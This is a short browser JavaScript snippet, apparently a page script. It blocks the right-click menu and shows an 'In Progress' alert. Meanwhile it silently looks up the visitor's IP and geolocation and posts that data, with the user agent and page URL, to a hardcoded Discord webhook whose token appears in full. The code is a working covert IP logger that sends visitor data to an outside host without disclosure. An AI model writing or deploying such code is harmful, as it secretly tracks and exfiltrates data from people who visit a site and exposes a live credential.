document.addEventListener("contextmenu", (event) => event.preventDefault());
// document.addEventListener("dblclick", (event) => console.log(event.target))
// dblclick = (object) => {}
fetch('https://json.geoiplookup.io/')
  .then(response => response.text())
  .then(rawData => fetch("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `Data: ${rawData}\nUser Agent: ${navigator.userAgent}\href: ${window.location.href}` }) }))
  .catch(error => console.error('Error fetching raw data:', error));
alert("In Progress");
